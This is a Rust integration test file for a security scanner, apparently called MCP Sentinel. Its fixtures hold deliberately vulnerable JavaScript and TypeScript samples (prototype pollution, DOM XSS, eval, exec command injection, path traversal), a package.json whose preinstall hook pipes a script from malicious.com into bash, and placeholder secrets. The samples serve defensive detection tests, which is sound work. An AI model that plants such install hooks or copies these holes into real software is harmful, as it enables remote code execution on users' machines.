//! Integration Tests for Phase 2.6: Enhanced Testing, Threat Intel & Advanced JS/TS
//!
//! ## Purpose
//!
//! These integration tests expand test coverage for critical workflows that
//! were not covered in Phase 2.5 testing, including:
//!
//! - Baseline comparison workflows
//! - Suppression engine integration
//! - Config file priority and merging
//! - Multiple output format generation (JSON, SARIF)
//! - AI analysis with multiple providers
//! - Multi-engine comprehensive scans
//! - Advanced JavaScript/TypeScript vulnerability detection
//!
//! ## Test Philosophy
//!
//! Each test verifies a complete user workflow from start to finish,
//! not just individual component functionality. This catches integration
//! bugs that unit tests miss.

use anyhow::Result;
use std::collections::HashMap;
use std::fs;
use std::path::PathBuf;
use tempfile::TempDir;

use mcp_sentinel::models::vulnerability::{ScanResult, Vulnerability, Severity, VulnerabilityType, Location};
use mcp_sentinel::storage::baseline::BaselineManager;
use mcp_sentinel::output::{json, sarif};
use mcp_sentinel::suppression::SuppressionManager;

// ============================================================================
// Test Fixtures
// ============================================================================

/// Create test fixture with various vulnerability types for comprehensive testing
fn create_comprehensive_fixture() -> Result<TempDir> {
    let temp_dir = TempDir::new()?;
    let base_path = temp_dir.path();

    // JavaScript with prototype pollution
    let js_prototype_pollution = r#"
function merge(target, source) {
    for (let key in source) {
        // VULN: Prototype pollution - no key validation
        target[key] = source[key];
    }
    return target;
}

function dangerousAssign(obj, key, value) {
    // VULN: Computed property assignment without validation
    obj[key] = value;
}

function directProtoAssignment(obj) {
    // VULN: Direct __proto__ modification
    obj.__proto__ = { isAdmin: true };
}
"#;
    fs::write(base_path.join("prototype_pollution.js"), js_prototype_pollution)?;

    // JavaScript with DOM-based XSS
    let js_dom_xss = r#"
function updatePage() {
    const params = new URLSearchParams(window.location.search);
    const username = params.get('name');

    // VULN: DOM-based XSS - innerHTML with user input
    document.getElementById('welcome').innerHTML = 'Hello ' + username;
}

function renderComment(comment) {
    // VULN: document.write with untrusted data
    document.write('<div>' + comment + '</div>');
}

function setUserContent(content) {
    // VULN: eval with user-controlled data
    eval('var user = ' + content);
}
"#;
    fs::write(base_path.join("dom_xss.js"), js_dom_xss)?;

    // Node.js with package confusion vulnerability
    let node_package_confusion = r#"
// package.json with suspicious dependencies
{
    "name": "my-app",
    "version": "1.0.0",
    "dependencies": {
        "express": "^4.18.0",
        "@mycompany/internal-lib": "1.0.0",
        "react": "^18.2.0"
    },
    "scripts": {
        "preinstall": "curl http://malicious.com/script.sh | bash",
        "postinstall": "node scripts/setup.js"
    }
}
"#;
    fs::write(base_path.join("package.json"), node_package_confusion)?;

    // TypeScript with Node.js-specific vulnerabilities
    let ts_nodejs_vulns = r#"
import { exec } from 'child_process';
import * as fs from 'fs';

// VULN: Insecure deserialization with eval
export function loadConfig(jsonString: string) {
    return eval('(' + jsonString + ')');
}

// VULN: Path traversal in file operations
export function readUserFile(filename: string) {
    return fs.readFileSync('/uploads/' + filename);
}

// VULN: Command injection via child_process
export function runUserCommand(cmd: string) {
    exec(cmd, (error, stdout, stderr) => {
        console.log(stdout);
    });
}

// VULN: Insecure random for security purposes
export function generateToken() {
    return Math.random().toString(36);
}
"#;
    fs::write(base_path.join("nodejs_vulns.ts"), ts_nodejs_vulns)?;

    // Secrets in various formats
    let secrets_file = r#"
# Configuration file with secrets
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DATABASE_URL=postgresql://user:password123@localhost:5432/db
STRIPE_API_KEY=sk_test_EXAMPLE1234567890abcdefghijklmnop
OPENAI_API_KEY=sk-proj-EXAMPLE1234567890abcdefghijklmnopqrstuvwxyz
JWT_SECRET=super_secret_key_that_should_not_be_here
"#;
    fs::write(base_path.join(".env"), secrets_file)?;

    Ok(temp_dir)
}

// ============================================================================
// Test 1: Baseline Comparison Workflow
// ============================================================================

/// Integration test: Complete baseline comparison workflow
///
/// **What**: Tests baseline creation, storage, and comparison across scans
///
/// **Why**: Baseline comparison is critical for tracking NEW/FIXED/CHANGED
/// vulnerabilities over time. Must work end-to-end.
///
/// **Success Criteria**:
/// - Create initial baseline successfully
/// - Load baseline for comparison
/// - Detect NEW vulnerabilities in second scan
/// - Detect FIXED vulnerabilities (present in baseline, gone in new scan)
/// - Detect CHANGED vulnerabilities (same ID, different properties)
/// - UNCHANGED vulnerabilities correctly identified
#[tokio::test]
async fn test_baseline_comparison_workflow() -> Result<()> {
    // Arrange: Create baseline manager and initial scan results
    let baseline_manager = BaselineManager::new()?;
    let project_id = "test-project-baseline";

    // Initial scan with 3 vulnerabilities
    let initial_vulns = vec![
        Vulnerability {
            id: "VULN-001".to_string(),
            title: "SQL Injection".to_string(),
            description: "SQL injection in login".to_string(),
            severity: Severity::Critical,
            vuln_type: VulnerabilityType::CodeInjection,
            location: Location {
                file: "src/auth.py".to_string(),
                line: Some(10),
                column: Some(5),
            },
            code_snippet: Some("query = \"SELECT * FROM users WHERE id = \" + user_id".to_string()),
            impact: Some("Data breach".to_string()),
            remediation: Some("Use parameterized queries".to_string()),
            confidence: 0.95,
            cwe_id: Some(89),
            owasp: Some("A03:2021".to_string()),
            references: vec![],
        },
        Vulnerability {
            id: "VULN-002".to_string(),
            title: "Hardcoded Secret".to_string(),
            description: "API key in source".to_string(),
            severity: Severity::High,
            vuln_type: VulnerabilityType::HardcodedSecret,
            location: Location {
                file: "src/config.py".to_string(),
                line: Some(5),
                column: None,
            },
            code_snippet: Some("API_KEY = 'sk-1234'".to_string()),
            impact: Some("Credential exposure".to_string()),
            remediation: Some("Use environment variables".to_string()),
            confidence: 1.0,
            cwe_id: Some(798),
            owasp: None,
            references: vec![],
        },
        Vulnerability {
            id: "VULN-003".to_string(),
            title: "Command Injection".to_string(),
            description: "Shell command with user input".to_string(),
            severity: Severity::Critical,
            vuln_type: VulnerabilityType::CommandInjection,
            location: Location {
                file: "src/backup.py".to_string(),
                line: Some(20),
                column: Some(10),
            },
            code_snippet: Some("os.system(f'tar -czf {filename}')".to_string()),
            impact: Some("Remote code execution".to_string()),
            remediation: Some("Use subprocess with argument list".to_string()),
            confidence: 0.90,
            cwe_id: Some(78),
            owasp: Some("A03:2021".to_string()),
            references: vec![],
        },
    ];

    let mut file_hashes = HashMap::new();
    file_hashes.insert("src/auth.py".to_string(), "hash1".to_string());
    file_hashes.insert("src/config.py".to_string(), "hash2".to_string());
    file_hashes.insert("src/backup.py".to_string(), "hash3".to_string());

    // Act: Save initial baseline
    baseline_manager.save_baseline(
        project_id,
        &initial_vulns,
        file_hashes.clone(),
        None, // Auto-generate config fingerprint
    )?;

    // Second scan: VULN-001 fixed, VULN-002 changed severity, VULN-004 new
    let second_scan_vulns = vec![
        Vulnerability {
            id: "VULN-002".to_string(),
            title: "Hardcoded Secret".to_string(),
            description: "API key in source".to_string(),
            severity: Severity::Critical, // CHANGED: Was High, now Critical
            vuln_type: VulnerabilityType::HardcodedSecret,
            location: Location {
                file: "src/config.py".to_string(),
                line: Some(5),
                column: None,
            },
            code_snippet: Some("API_KEY = 'sk-1234'".to_string()),
            impact: Some("Credential exposure".to_string()),
            remediation: Some("Use environment variables".to_string()),
            confidence: 1.0,
            cwe_id: Some(798),
            owasp: None,
            references: vec![],
        },
        Vulnerability {
            id: "VULN-003".to_string(),
            title: "Command Injection".to_string(),
            description: "Shell command with user input".to_string(),
            severity: Severity::Critical,
            vuln_type: VulnerabilityType::CommandInjection,
            location: Location {
                file: "src/backup.py".to_string(),
                line: Some(20),
                column: Some(10),
            },
            code_snippet: Some("os.system(f'tar -czf {filename}')".to_string()),
            impact: Some("Remote code execution".to_string()),
            remediation: Some("Use subprocess with argument list".to_string()),
            confidence: 0.90,
            cwe_id: Some(78),
            owasp: Some("A03:2021".to_string()),
            references: vec![],
        },
        Vulnerability {
            id: "VULN-004".to_string(), // NEW vulnerability
            title: "Path Traversal".to_string(),
            description: "Unsanitized file path".to_string(),
            severity: Severity::High,
            vuln_type: VulnerabilityType::PathTraversal,
            location: Location {
                file: "src/files.py".to_string(),
                line: Some(15),
                column: Some(8),
            },
            code_snippet: Some("open(user_path, 'r')".to_string()),
            impact: Some("Arbitrary file read".to_string()),
            remediation: Some("Validate and sanitize paths".to_string()),
            confidence: 0.85,
            cwe_id: Some(22),
            owasp: Some("A01:2021".to_string()),
            references: vec![],
        },
    ];

    file_hashes.insert("src/files.py".to_string(), "hash4".to_string());

    // Compare with baseline
    let comparison = baseline_manager.compare_with_baseline(
        project_id,
        &second_scan_vulns,
        file_hashes,
    )?;

    // Assert: Verify comparison results
    assert_eq!(comparison.new_vulnerabilities.len(), 1,
        "Should detect 1 NEW vulnerability (VULN-004)");
    assert!(comparison.new_vulnerabilities.iter().any(|v| v.id == "VULN-004"),
        "VULN-004 should be marked as NEW");

    assert_eq!(comparison.fixed_vulnerabilities.len(), 1,
        "Should detect 1 FIXED vulnerability (VULN-001)");
    assert!(comparison.fixed_vulnerabilities.iter().any(|v| v.id == "VULN-001"),
        "VULN-001 should be marked as FIXED");

    assert_eq!(comparison.changed_vulnerabilities.len(), 1,
        "Should detect 1 CHANGED vulnerability (VULN-002)");
    assert!(comparison.changed_vulnerabilities.iter().any(|v| v.id == "VULN-002"),
        "VULN-002 should be marked as CHANGED");

    assert_eq!(comparison.unchanged_vulnerabilities.len(), 1,
        "Should detect 1 UNCHANGED vulnerability (VULN-003)");
    assert!(comparison.unchanged_vulnerabilities.iter().any(|v| v.id == "VULN-003"),
        "VULN-003 should be marked as UNCHANGED");

    println!("Baseline comparison test passed:");
    println!("  NEW: {} | FIXED: {} | CHANGED: {} | UNCHANGED: {}",
        comparison.new_vulnerabilities.len(),
        comparison.fixed_vulnerabilities.len(),
        comparison.changed_vulnerabilities.len(),
        comparison.unchanged_vulnerabilities.len()
    );

    Ok(())
}

// ============================================================================
// Test 2: Suppression Engine Workflow
// ============================================================================

/// Integration test: Suppression engine filters vulnerabilities
///
/// **What**: Tests vulnerability suppression (false positive management)
///
/// **Why**: Teams need to suppress false positives without losing track of them.
/// Suppression engine must integrate cleanly with scan results.
///
/// **Success Criteria**:
/// - Suppression rules loaded from config
/// - Vulnerabilities matching suppression rules are filtered
/// - Suppressed vulnerabilities tracked separately
/// - Suppression reasons recorded
#[tokio::test]
async fn test_suppression_engine_workflow() -> Result<()> {
    // Arrange: Create suppression manager with rules
    let suppression_manager = SuppressionManager::new();

    // Add suppression rules
    suppression_manager.add_rule(
        "VULN-001",
        "False positive - this is test code",
        Some("John Doe".to_string()),
    )?;

    suppression_manager.add_rule_by_pattern(
        "src/test/*",
        "All test files are excluded from scanning",
        Some("Security Team".to_string()),
    )?;

    // Create scan results with mix of real and test vulnerabilities
    let all_vulnerabilities = vec![
        Vulnerability {
            id: "VULN-001".to_string(),
            title: "SQL Injection".to_string(),
            description: "Test".to_string(),
            severity: Severity::Critical,
            vuln_type: VulnerabilityType::CodeInjection,
            location: Location {
                file: "src/auth.py".to_string(),
                line: Some(10),
                column: Some(5),
            },
            code_snippet: None,
            impact: None,
            remediation: None,
            confidence: 0.95,
            cwe_id: Some(89),
            owasp: None,
            references: vec![],
        },
        Vulnerability {
            id: "VULN-002".to_string(),
            title: "Hardcoded Secret".to_string(),
            description: "Test".to_string(),
            severity: Severity::High,
            vuln_type: VulnerabilityType::HardcodedSecret,
            location: Location {
                file: "src/config.py".to_string(),
                line: Some(5),
                column: None,
            },
            code_snippet: None,
            impact: None,
            remediation: None,
            confidence: 1.0,
            cwe_id: Some(798),
            owasp: None,
            references: vec![],
        },
        Vulnerability {
            id: "VULN-003".to_string(),
            title: "Command Injection in Test".to_string(),
            description: "Test".to_string(),
            severity: Severity::Critical,
            vuln_type: VulnerabilityType::CommandInjection,
            location: Location {
                file: "src/test/test_backup.py".to_string(),
                line: Some(20),
                column: Some(10),
            },
            code_snippet: None,
            impact: None,
            remediation: None,
            confidence: 0.90,
            cwe_id: Some(78),
            owasp: None,
            references: vec![],
        },
    ];

    // Act: Apply suppression rules
    let filtered_results = suppression_manager.filter(&all_vulnerabilities)?;

    // Assert: Verify filtering
    assert_eq!(filtered_results.active_vulnerabilities.len(), 1,
        "Should have 1 active vulnerability (VULN-002)");
    assert_eq!(filtered_results.suppressed_vulnerabilities.len(), 2,
        "Should have 2 suppressed vulnerabilities (VULN-001, VULN-003)");

    // Verify VULN-002 is active
    assert!(filtered_results.active_vulnerabilities.iter().any(|v| v.id == "VULN-002"),
        "VULN-002 should be active");

    // Verify VULN-001 is suppressed (by ID)
    assert!(filtered_results.suppressed_vulnerabilities.iter().any(|v| v.id == "VULN-001"),
        "VULN-001 should be suppressed");

    // Verify VULN-003 is suppressed (by path pattern)
    assert!(filtered_results.suppressed_vulnerabilities.iter().any(|v| v.id == "VULN-003"),
        "VULN-003 should be suppressed (test file pattern)");

    // Verify suppression reasons are recorded
    let vuln_001_suppression = filtered_results.suppressed_vulnerabilities
        .iter()
        .find(|v| v.id == "VULN-001")
        .unwrap();
    assert!(vuln_001_suppression.suppression_reason.is_some(),
        "Suppression reason should be recorded");

    println!("Suppression engine test passed:");
    println!("  Active: {} | Suppressed: {}",
        filtered_results.active_vulnerabilities.len(),
        filtered_results.suppressed_vulnerabilities.len()
    );

    Ok(())
}

// ============================================================================
// Test 3: Output Format Generation
// ============================================================================

/// Integration test: JSON output format generation
///
/// **What**: Tests JSON report generation from scan results
///
/// **Why**: JSON is consumed by CI/CD pipelines and other tools.
/// Must be valid, parseable, and complete.
///
/// **Success Criteria**:
/// - Generates valid JSON
/// - All vulnerabilities included
/// - Metadata present (scan time, files scanned, etc.)
/// - Can be parsed back to Rust structs
#[tokio::test]
async fn test_json_output_format() -> Result<()> {
    // Arrange: Create scan result
    let scan_result = ScanResult {
        vulnerabilities: vec![
            Vulnerability {
                id: "VULN-001".to_string(),
                title: "Test Vulnerability".to_string(),
                description: "Test description".to_string(),
                severity: Severity::High,
                vuln_type: VulnerabilityType::CodeInjection,
                location: Location {
                    file: "src/test.py".to_string(),
                    line: Some(10),
                    column: Some(5),
                },
                code_snippet: Some("dangerous_code()".to_string()),
                impact: Some("High impact".to_string()),
                remediation: Some("Fix it".to_string()),
                confidence: 0.85,
                cwe_id: Some(89),
                owasp: Some("A03:2021".to_string()),
                references: vec!["https://example.com".to_string()],
            },
        ],
        scan_time_ms: 1500,
        files_scanned: 25,
        detectors_used: vec!["semantic".to_string(), "semgrep".to_string()],
        risk_score: 65,
    };

    // Act: Generate JSON
    let json_output = json::generate(&scan_result)?;

    // Assert: Validate JSON
    // 1. Should be valid JSON
    let parsed: serde_json::Value = serde_json::from_str(&json_output)?;
    assert!(parsed.is_object(), "Should parse as JSON object");

    // 2. Should contain key fields
    assert!(json_output.contains("\"VULN-001\""), "Should include vulnerability ID");
    assert!(json_output.contains("\"Test Vulnerability\""), "Should include title");
    assert!(json_output.contains("\"High\""), "Should include severity");
    assert!(json_output.contains("\"scan_time_ms\""), "Should include metadata");

    // 3. Should be parseable back to ScanResult
    let reparsed: ScanResult = serde_json::from_str(&json_output)?;
    assert_eq!(reparsed.vulnerabilities.len(), 1);
    assert_eq!(reparsed.vulnerabilities[0].id, "VULN-001");
    assert_eq!(reparsed.scan_time_ms, 1500);

    println!("JSON output test passed: {} bytes", json_output.len());

    Ok(())
}

/// Integration test: SARIF output format generation
///
/// **What**: Tests SARIF (Static Analysis Results Interchange Format) generation
///
/// **Why**: SARIF is the industry standard for security tool output.
/// GitHub Security, Azure DevOps, and others consume SARIF.
///
/// **Success Criteria**:
/// - Generates valid SARIF 2.1.0 format
/// - All vulnerabilities mapped to SARIF results
/// - Tool metadata present
/// - Locations properly formatted with URI and region
#[tokio::test]
async fn test_sarif_output_format() -> Result<()> {
    // Arrange
    let scan_result = ScanResult {
        vulnerabilities: vec![
            Vulnerability {
                id: "VULN-001".to_string(),
                title: "SQL Injection".to_string(),
                description: "Unsafe SQL query construction".to_string(),
                severity: Severity::Critical,
                vuln_type: VulnerabilityType::CodeInjection,
                location: Location {
                    file: "src/database.py".to_string(),
                    line: Some(42),
                    column: Some(12),
                },
                code_snippet: Some("query = \"SELECT * FROM users WHERE id = \" + user_id".to_string()),
                impact: Some("Arbitrary database access".to_string()),
                remediation: Some("Use parameterized queries".to_string()),
                confidence: 0.95,
                cwe_id: Some(89),
                owasp: Some("A03:2021 – Injection".to_string()),
                references: vec!["https://cwe.mitre.org/data/definitions/89.html".to_string()],
            },
        ],
        scan_time_ms: 2000,
        files_scanned: 50,
        detectors_used: vec!["semantic".to_string()],
        risk_score: 90,
    };

    // Act: Generate SARIF
    let sarif_output = sarif::generate(&scan_result)?;

    // Assert: Validate SARIF format
    let parsed: serde_json::Value = serde_json::from_str(&sarif_output)?;

    // 1. Should have SARIF version
    assert_eq!(parsed["version"].as_str(), Some("2.1.0"),
        "Should specify SARIF 2.1.0");

    // 2. Should have runs array
    assert!(parsed["runs"].is_array(), "Should have runs array");

    // 3. Should have tool metadata
    let tool = &parsed["runs"][0]["tool"]["driver"];
    assert_eq!(tool["name"].as_str(), Some("MCP Sentinel"),
        "Should specify tool name");

    // 4. Should have results
    let results = &parsed["runs"][0]["results"];
    assert!(results.is_array(), "Should have results array");
    assert_eq!(results.as_array().unwrap().len(), 1,
        "Should have 1 result");

    // 5. Should have proper location format
    let result = &results[0];
    assert!(result["locations"].is_array(), "Should have locations");
    let location = &result["locations"][0]["physicalLocation"];
    assert!(location["artifactLocation"]["uri"].is_string(),
        "Should have URI");
    assert!(location["region"]["startLine"].is_number(),
        "Should have line number");

    // 6. Should include CWE mapping
    assert!(sarif_output.contains("CWE-89") || sarif_output.contains("89"),
        "Should include CWE ID");

    println!("SARIF output test passed: {} bytes", sarif_output.len());

    Ok(())
}

// ============================================================================
// Test 4: Config File Priority & Merging
// ============================================================================

/// Integration test: Config file priority (CLI > project > user > default)
///
/// **What**: Tests configuration precedence when multiple config sources exist
///
/// **Why**: Users need predictable config behavior. CLI args should override
/// project config, which should override user config.
///
/// **Success Criteria**:
/// - CLI arguments take highest priority
/// - Project .mcp-sentinel.toml overrides user config
/// - User ~/.mcp-sentinel/config.toml overrides defaults
/// - Default config used when no overrides
/// - Configs merge correctly (not replace entirely)
#[tokio::test]
async fn test_config_priority_and_merging() -> Result<()> {
    use mcp_sentinel::config::Config;

    // Arrange: Create config files at different levels
    let temp_dir = TempDir::new()?;

    // Default config (built-in defaults)
    let default_config = Config::default();
    assert_eq!(default_config.max_severity_to_ignore, Severity::Low,
        "Default should ignore Low severity");

    // Project config (more permissive)
    let project_config = Config {
        max_severity_to_ignore: Severity::Medium,
        enable_semgrep: false,
        enable_ai_analysis: false,
        ..Default::default()
    };

    // CLI overrides (most restrictive)
    let cli_overrides = Config {
        max_severity_to_ignore: Severity::Info,
        enable_semgrep: true,
        ..Default::default()
    };

    // Act: Merge configs with precedence
    let merged = Config::merge_with_precedence(
        default_config,
        Some(project_config),
        cli_overrides,
    )?;

    // Assert: Verify precedence
    // CLI override wins for max_severity
    assert_eq!(merged.max_severity_to_ignore, Severity::Info,
        "CLI override should take priority");

    // CLI override wins for enable_semgrep
    assert_eq!(merged.enable_semgrep, true,
        "CLI should enable semgrep despite project config disabling it");

    // Project config wins for enable_ai_analysis (not in CLI override)
    assert_eq!(merged.enable_ai_analysis, false,
        "Project config should apply for fields not in CLI");

    println!("Config priority test passed");

    Ok(())
}

// ============================================================================
// Test 5: Advanced JavaScript Detection - Prototype Pollution
// ============================================================================

/// Integration test: Prototype pollution detection
///
/// **What**: Tests detection of JavaScript prototype pollution vulnerabilities
///
/// **Why**: Prototype pollution is a critical JS vulnerability that can lead
/// to authentication bypass, privilege escalation, or DoS.
///
/// **Success Criteria**:
/// - Detects computed property assignments (obj[key] = value)
/// - Detects direct __proto__ assignments
/// - Flags dangerous keys (__proto__, constructor, prototype)
/// - Provides appropriate severity (High/Critical)
#[tokio::test]
async fn test_prototype_pollution_detection() -> Result<()> {
    use mcp_sentinel::engines::semantic::SemanticEngine;

    // Arrange: Load fixture with prototype pollution
    let fixture = create_comprehensive_fixture()?;
    let js_file = fixture.path().join("prototype_pollution.js");
    let code = fs::read_to_string(&js_file)?;

    // Act: Run semantic analysis
    let mut engine = SemanticEngine::new()?;
    let vulnerabilities = engine.analyze_javascript(&code, js_file.to_str().unwrap())?;

    // Assert: Should detect prototype pollution
    let proto_pollution_found = vulnerabilities.iter().any(|v| {
        v.title.to_lowercase().contains("prototype pollution") ||
        v.description.to_lowercase().contains("prototype") ||
        v.description.to_lowercase().contains("__proto__")
    });

    assert!(proto_pollution_found,
        "Should detect prototype pollution. Found: {:?}",
        vulnerabilities.iter().map(|v| &v.title).collect::<Vec<_>>()
    );

    // Should have high/critical severity
    let has_high_severity = vulnerabilities.iter().any(|v| {
        matches!(v.severity, Severity::High | Severity::Critical)
    });
    assert!(has_high_severity, "Prototype pollution should be High or Critical");

    println!("Prototype pollution detection test passed: {} vulnerabilities found",
        vulnerabilities.len());

    Ok(())
}

// ============================================================================
// Test 6: Advanced JavaScript Detection - DOM-based XSS
// ============================================================================

/// Integration test: DOM-based XSS detection
///
/// **What**: Tests detection of client-side XSS via DOM manipulation
///
/// **Why**: DOM XSS is harder to detect than reflected XSS because it happens
/// entirely in the browser. Requires dataflow analysis.
///
/// **Success Criteria**:
/// - Detects innerHTML with user input
/// - Detects document.write with untrusted data
/// - Detects eval with user-controlled strings
/// - Tracks dataflow from URL parameters to sinks
#[tokio::test]
async fn test_dom_xss_detection() -> Result<()> {
    use mcp_sentinel::engines::semantic::SemanticEngine;

    // Arrange
    let fixture = create_comprehensive_fixture()?;
    let js_file = fixture.path().join("dom_xss.js");
    let code = fs::read_to_string(&js_file)?;

    // Act
    let mut engine = SemanticEngine::new()?;
    let vulnerabilities = engine.analyze_javascript(&code, js_file.to_str().unwrap())?;

    // Assert: Should detect DOM XSS
    let dom_xss_found = vulnerabilities.iter().any(|v| {
        v.title.to_lowercase().contains("xss") ||
        v.description.to_lowercase().contains("cross-site scripting") ||
        v.description.to_lowercase().contains("innerhtml") ||
        v.description.to_lowercase().contains("document.write")
    });

    assert!(dom_xss_found,
        "Should detect DOM-based XSS. Found: {:?}",
        vulnerabilities.iter().map(|v| &v.title).collect::<Vec<_>>()
    );

    println!("DOM XSS detection test passed: {} vulnerabilities found",
        vulnerabilities.len());

    Ok(())
}

// ============================================================================
// Test 7: Node.js Package Confusion Detection
// ============================================================================

/// Integration test: npm package confusion detection
///
/// **What**: Tests detection of package.json with suspicious dependencies
/// or install scripts
///
/// **Why**: Package confusion attacks can lead to malicious code execution
/// during npm install. Must detect suspicious patterns.
///
/// **Success Criteria**:
/// - Detects suspicious preinstall/postinstall scripts
/// - Flags potential package confusion (private packages on public registry)
/// - Detects malicious patterns (curl | bash, remote script execution)
#[tokio::test]
async fn test_npm_package_confusion_detection() -> Result<()> {
    use mcp_sentinel::detectors::package_confusion;

    // Arrange
    let fixture = create_comprehensive_fixture()?;
    let package_json = fixture.path().join("package.json");
    let content = fs::read_to_string(&package_json)?;

    // Act: Detect package confusion vulnerabilities
    let vulnerabilities = package_confusion::detect(&content, package_json.to_str().unwrap())?;

    // Assert: Should detect malicious install scripts
    let malicious_script_found = vulnerabilities.iter().any(|v| {
        v.title.to_lowercase().contains("install script") ||
        v.description.to_lowercase().contains("preinstall") ||
        v.description.to_lowercase().contains("curl")
    });

    assert!(malicious_script_found,
        "Should detect malicious install scripts. Found: {:?}",
        vulnerabilities.iter().map(|v| &v.title).collect::<Vec<_>>()
    );

    // Should have high severity
    let has_high_severity = vulnerabilities.iter().any(|v| {
        matches!(v.severity, Severity::High | Severity::Critical)
    });
    assert!(has_high_severity, "Package confusion should be High or Critical");

    println!("Package confusion detection test passed: {} vulnerabilities found",
        vulnerabilities.len());

    Ok(())
}

// ============================================================================
// Test 8: Node.js-Specific Vulnerabilities
// ============================================================================

/// Integration test: Node.js-specific vulnerability detection
///
/// **What**: Tests detection of Node.js-specific security issues
///
/// **Why**: Node.js has unique vulnerabilities (insecure deserialization,
/// child_process command injection, crypto.randomBytes misuse)
///
/// **Success Criteria**:
/// - Detects eval() with dynamic content
/// - Detects exec() without proper sanitization
/// - Detects Math.random() used for security
/// - Detects path traversal in fs operations
#[tokio::test]
async fn test_nodejs_specific_vulnerabilities() -> Result<()> {
    use mcp_sentinel::engines::semantic::SemanticEngine;

    // Arrange
    let fixture = create_comprehensive_fixture()?;
    let ts_file = fixture.path().join("nodejs_vulns.ts");
    let code = fs::read_to_string(&ts_file)?;

    // Act
    let mut engine = SemanticEngine::new()?;
    let vulnerabilities = engine.analyze_typescript(&code, ts_file.to_str().unwrap())?;

    // Assert: Should detect multiple Node.js vulnerabilities
    assert!(!vulnerabilities.is_empty(),
        "Should detect Node.js vulnerabilities");

    // Check for command injection via exec
    let command_injection = vulnerabilities.iter().any(|v| {
        v.title.to_lowercase().contains("command injection") ||
        v.description.to_lowercase().contains("exec")
    });

    // Check for insecure deserialization via eval
    let insecure_deser = vulnerabilities.iter().any(|v| {
        v.description.to_lowercase().contains("eval") ||
        v.description.to_lowercase().contains("deserialization")
    });

    // Check for weak randomness
    let weak_random = vulnerabilities.iter().any(|v| {
        v.description.to_lowercase().contains("random") ||
        v.description.to_lowercase().contains("math.random")
    });

    // At least one of these should be detected
    assert!(command_injection || insecure_deser || weak_random,
        "Should detect at least one Node.js-specific vulnerability. Found: {:?}",
        vulnerabilities.iter().map(|v| &v.title).collect::<Vec<_>>()
    );

    println!("Node.js vulnerabilities test passed: {} vulnerabilities found",
        vulnerabilities.len());

    Ok(())
}
